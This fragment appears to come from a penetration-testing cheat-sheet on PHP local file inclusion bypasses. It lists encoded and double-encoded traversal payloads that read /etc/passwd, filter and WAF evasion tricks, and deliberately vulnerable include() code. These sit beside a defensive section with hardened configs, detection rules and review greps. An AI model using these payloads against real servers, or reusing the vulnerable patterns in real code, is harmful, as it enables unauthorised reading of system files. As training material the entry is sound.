      "variations": [
        {
          "label": "URL-encoded",
          "command": "http://<ip>:<port>/index.php?language=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64"
        },
        {
          "label": "Double URL-encoded (WAF bypass)",
          "command": "http://<ip>:<port>/index.php?language=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd"
        },
        {
          "label": "Approved path prefix",
          "command": "http://<ip>:<port>/index.php?language=./languages/../../../../etc/passwd"
        },
        {
          "label": "Glob pattern bypass (PHP regex/filter on literal dots)",
          "command": "cat .?/.*/.?/etc/passwd"
        },
        {
          "label": "Glob bypass — PHP interactive shell test",
          "command": "php -a\necho file_get_contents('.?/.*/.?/etc/passwd');"
        }
      ],
      "opsec": "loud",
      "mitre": [
        "T1190",
        "T1005"
      ],
      "exam": "exam-ok",
      "defense": {
        "prerequisites": "A web application passes user-controlled input to a file inclusion function (PHP: include/require, Node.js: fs.readFile/res.render, Java: jsp:include, .NET: Response.WriteFile) without validation or path restriction. The application must have read access to the target file. For RFI: allow_url_include must be On in php.ini.",
        "misconfiguration": "User-controlled input passed directly to include()/require() without path validation. No open_basedir restriction locking PHP to the web root. allow_url_include = On (enables RFI). allow_url_fopen = On. No allowlist of permitted filenames/paths. PHP configuration exposes error messages (reveals file paths). Dangerous PHP extensions enabled (expect, phar).",
        "vulnerable_config": "# PHP — classic LFI vulnerability:\ninclude($_GET['language']);              // absolute path direct include\ninclude('./languages/' . $_GET['language']); // path prefix bypass possible\ninclude($_GET['language'] . '.php');    // extension bypass with null byte or wrappers\n\n# PHP config that enables RFI:\n; php.ini\nallow_url_include = On\nallow_url_fopen = On\n; No open_basedir set\n\n# NodeJS — path traversal:\nfs.readFile(path.join(__dirname, req.query.language), callback);\n// No path validation — ../../etc/passwd traverses out of app root",
        "secure_config": "# PHP — allowlist only permitted files:\n$allowed = ['en', 'es', 'fr'];\nif (!in_array($_GET['language'], $allowed)) { die('Invalid language'); }\ninclude('./languages/' . $_GET['language'] . '.php');\n\n# Use basename() to strip path traversal:\n$lang = basename($_GET['language']);\ninclude('./languages/' . $lang . '.php');\n\n# PHP configuration hardening:\n; php.ini\nallow_url_include = Off\nallow_url_fopen = Off\nopen_basedir = /var/www/html   ; locks include() to web root\ndisable_functions = system,exec,passthru,shell_exec  ; prevent RCE if LFI found\nexpect.output_handler =        ; disable expect extension\n\n# NodeJS — resolve and validate path:\nconst safe = path.resolve(__dirname, 'languages', req.query.language);\nif (!safe.startsWith(path.resolve(__dirname, 'languages'))) {\n    return res.status(403).send('Forbidden');\n}\nfs.readFile(safe, callback);\n\n# WAF: ModSecurity with traversal rules (../), PHP wrapper rules (php://)",
        "evasion": "Non-recursive filter bypass: ....// (becomes ../ after one str_replace pass). URL encoding: %2e%2e%2f. Double URL encoding: %252e%252e%252f. Path truncation (PHP<5.3/5.4): pad path to 4096 chars. Null byte injection (PHP<5.5): /etc/passwd%00.php. Approved-path bypass: ./languages/../../../../etc/passwd. PHP wrappers bypass file extension appending: php://filter/read=convert.base64-encode/resource=config. Data wrapper encodes payload in URL.",
        "sources": [
          "HTB M20",
          "MITRE T1083",
          "MITRE T1505.003",
          "OWASP A05:2021"
        ],
        "why_it_works": "Non-recursive str_replace('../', '', $input) removes the first layer of ../ but leaves the result. Input ....// becomes ../ after one replacement pass. URL encoding (%2e%2e%2f) bypasses string-matching filters operating on decoded values if the filter runs before URL decoding. Double encoding (%252e%252e%252f) bypasses filters that decode once. Approved-path bypass prepends the required prefix then traverses: ./languages/../../../../etc/passwd.",
        "impact": "Bypass server-side input filtering to achieve LFI — these techniques work against developers who attempt to sanitize rather than allowlist. Reaches the same file read impact as basic LFI.",
        "detection": "[MITRE T1083] WAF with normalisation: decode URL encoding, then normalise path, then check for traversal — catches all encoding variants. Application: recursive sanitization (while loop) catches non-recursive bypass.",
        "artifacts": "Access log: encoded traversal patterns (%2e%2e%2f, %252e%252e, ....//). WAF log: multiple bypass attempt variants before successful evasion.",
        "code_review": "RED FLAGS (source): user input passed to include/require/file functions.\n  include($_GET['page'])  |  require($base.$user)  |  file_get_contents($_REQUEST['f'])  |  fopen($path)\nGREP:  grep -rniE \"(include|include_once|require|require_once|fopen|readfile|file_get_contents|file\\()\\s*\\(.*\\$_\" .\nSAFE:  allowlist map of includable pages (basename + whitelist), open_basedir, allow_url_include=Off, no user input in path."
      }
